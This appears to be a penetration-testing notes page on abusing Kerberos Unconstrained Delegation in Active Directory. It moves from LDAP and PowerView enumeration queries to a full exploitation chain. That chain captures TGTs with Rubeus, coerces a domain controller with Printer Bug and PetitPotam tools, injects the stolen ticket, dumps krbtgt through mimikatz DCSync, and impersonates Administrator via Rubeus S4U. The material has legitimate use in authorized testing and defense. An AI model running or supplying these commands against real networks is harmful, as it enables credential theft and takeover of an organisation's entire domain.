## Information

> Con `Unconstrained delegation` puedes cargar un 10. Diamond Ticket

- What it is: Unconstrained Delegation is an unsafe Kerberos configuration where a server can receive the full TGT of any user authenticating to it. That TGT remains in LSASS, allowing the server to act fully in the name of that user or machine account. If you control the host, you control those TGTs.
- Scope: with a captured TGT, whether from a user or a host, you can impersonate identities across any domain service: SMB, LDAP, MSSQL, WinRM, CIFS, HTTP, and more. If the TGT belongs to a privileged user or critical server, the impact can become full service or domain control.
- Limitation: you only get TGTs from users or computers that authenticate to that host. You cannot extract tickets from unrelated systems unless you coerce a privileged principal to connect.

<div style="margin: 1.4rem 0 1.7rem; border: 1px solid rgba(84, 129, 214, 0.16); border-radius: 18px; overflow: hidden; background: rgba(8, 11, 20, 0.72); box-shadow: 0 14px 32px rgba(0, 0, 0, 0.28);">
  <iframe src="/trust-maps/ad/unconstrained.html" title="Unconstrained Delegation Diagram" loading="lazy" style="width: 100%; height: 620px; border: 0; display: block; background: transparent;"></iframe>
</div>

1. A user provides credentials to the domain controller.
2. The domain controller returns a TGT.
3. The user authenticates in the domain by requesting a TGS for the web server.
4. The KDC returns a TGS containing the `ok-as-delegate` flag, indicating that the service can receive delegation.
5. The user authenticates to the web server. During Kerberos authentication, the user sends the TGS and also the TGT because the service is configured with Unconstrained Delegation.
6. The web server service account uses the user's TGT to request a TGS for the database server from the domain controller, acting on behalf of the user.
7. The web server account can then authenticate as that user with all of that user's privileges.

> In this case the web server acts as a full proxy for the user because it receives and can reuse the user's TGT from memory to request tickets for any other domain resource. If you compromise that server, you can move through the domain with any identity that passes through it. This is possible because the host has the `TRUSTED_FOR_DELEGATION` flag enabled in `UserAccountControl (524288)`.

- [ ] Requirements

- Host with Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`), without needing users already logged on.
- Active Spooler service on the target (for example a DC).
- Any authenticated user can force authentication through the Printer Bug without admin or SYSTEM.
- Ability to coerce authentication (MS-RPRN / Spooler).
- Access to the Unconstrained Delegation host to capture tickets.
- High privileges only on the delegation host itself (SYSTEM/Admin)

- [ ] Printer Bug (MS-RPRN)

> Printer Bug is not the core problem. Unconstrained Delegation is.

The Printer Bug abuses a function in the MS-RPRN protocol that lets any authenticated user force a machine with the Spooler service enabled to authenticate to an arbitrary host. This allows:

- forcing a remote host to authenticate to an attacker-controlled machine
- capturing its TGT if the attacker's machine is configured with Unconstrained Delegation

<div style="margin: 1.4rem 0 1.7rem; border: 1px solid rgba(84, 129, 214, 0.16); border-radius: 18px; overflow: hidden; background: rgba(8, 11, 20, 0.72); box-shadow: 0 14px 32px rgba(0, 0, 0, 0.28);">
  <iframe src="/trust-maps/ad/msrprn.html" title="MS-RPRN Printer Bug Diagram" loading="lazy" style="width: 100%; height: 480px; border: 0; display: block; background: transparent;"></iframe>
</div>

> [MS-RPRN: Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)

## Enumeration

> Ignore Domain Controllers if they appear in the list because they often have Unconstrained Delegation by default in lab-style environments.

- [ ] ldapsearch

```powershell
# HOSTS (Unconstrained Delegation)
ldapsearch "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,userAccountControl

# USERS (Unconstrained Delegation)
ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,userAccountControl
```

- [ ] AD

```powershell
# HOSTS (Unconstrained Delegation)
Get-ADObject -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties sAMAccountName,userAccountControl | select sAMAccountName,userAccountControl

# USERS (Unconstrained Delegation)
Get-ADObject -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties sAMAccountName,userAccountControl | select sAMAccountName,userAccountControl
```

- [ ] POWERVIEW

```powershell
# HOSTS (Unconstrained Delegation)
Get-DomainObject -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties samaccountname,useraccountcontrol | select samaccountname,useraccountcontrol

# USERS (Unconstrained Delegation)
Get-DomainObject -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties samaccountname,useraccountcontrol | select samaccountname,useraccountcontrol
```

## Exploitation

In lab environments, it is common to capture TGTs by waiting for a user, even a Domain Admin, to interact with a host configured with **Unconstrained Delegation**. In the real world, this is not reliable: you cannot depend on a privileged user authenticating exactly while you are monitoring. Although **user coercion** techniques exist, such as `.lnk` or `.url` files, they still require human interaction. For that reason, the realistic approach is to force a machine, for example a Domain Controller, to authenticate to your host with Unconstrained Delegation, capture its TGT, and exploit it in a deterministic way.

> Forcing authentication (Printer Bug MS-RPRN or MS-EFSRPC/PetitPotam) is the realistic approach, because it forces the TGT to arrive.

1. Capture the TGT with Rubeus

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

2. Force authentication (does not require a high-privileged token)

```powershell
# Printer Bug MS-RPRN
.\MS-RPRN.exe \\dc01.domain.local \\host_attack.domain.local

# PetitPotam (MS-EFSRPC). You may need to run it several times (8 times)
.\SharpSpoolTrigger.exe dc011 host_attack-1
# NdrClientCall2x64
# [-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6

.\PetitPotam.exe host_attack dc01
```

- `host_attack`: Host with unconstrained delegation
- `dc01`: Host I am forcing to authenticate
- `SharpSpoolTrigger.exe`: offensive tool that abuses weaknesses in the Windows Print Spooler service to force a remote host (the victim) to authenticate to another machine (yours), with the goal of capturing its Kerberos TGT.
- `NdrClientCall2x64`: internal Windows function used for RPC calls. It only shows that the tool is attempting the remote operation.
- `[-] RpcRemoteFindFirstPrinterChangeNotificationEx status: 6`: `status: 6` (`ERROR_INVALID_HANDLE`) indicates that the attempt to abuse the Print Spooler formally failed (service inactive, protected, or exploit ineffective). Even so, authentication may still have been triggered and the TGT captured, so always check Rubeus even if you see this error.

3. Inject and use the ticket as `Administrator` to access the resource

```powershell
# Rubeus
.\Rubeus.exe ptt /ticket:

# SMB
ls \\dc01.domain.local\c$

# LDAP
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:domain\krbtgt" "exit"
```

If it is not possible to access the Domain Controller through WinRM, SMB, or RDP, but we do have a principal with replication privileges, it is possible to execute **DCSync**. In this case, the DC machine account already has those rights by default, so the abuse works directly. In many cases, **DCSync is equal to or better than getting a shell on the DC**, because it:

- generates less operational noise,
- does not require an interactive session,
- allows direct extraction of critical secrets such as `krbtgt`,
- and grants logical control over the domain.

- [ ] Optional: S4U Impersonation

> This step is not required to compromise the domain when you already have the TGT of a Domain Controller machine account. It is included only as an additional technique to show how to transform a machine TGT into tickets impersonating specific users.

Legitimate **S4U2Self** requires the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag (Constrained Delegation with Protocol Transition). In this case, it is not necessary, because we are not using S4U2Self as delegation, but abusing it with a stolen machine TGT obtained through Unconstrained Delegation. Here, S4U2Self is only used to transform that TGT into a usable TGS, not to validate delegation permissions.

With the machine TGT, generate a TGS as `Administrator` for the CIFS service on the same host:

```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc01 /nowrap /ptt /ticket:
```

> It allows the machine TGT to be transformed into a valid ticket to access the host itself as `Administrator`, generating a CIFS ticket that can be decrypted by the machine account (`SYSTEM`).

- `/impersonateuser`: user to impersonate
- `/self`: S4U2self only (no proxy). This generates a TGS as Administrator, but for the same service on the host, or the one specified with `altservice`
- `/altservice`: requests that the S4U2self ticket be issued for `CIFS/dc01` instead of the default service. By default, every domain-joined Windows host automatically publishes an SPN for its SMB/CIFS service
- `/ticket`: the victim machine TGT, which is the identity of the service performing the delegation. On machines with unconstrained delegation, that TGT is allowed to request tickets **on behalf of any user**
- `s4u`: executes the S4U2self flow with this machine TGT and builds a TGS “as if I were” the user specified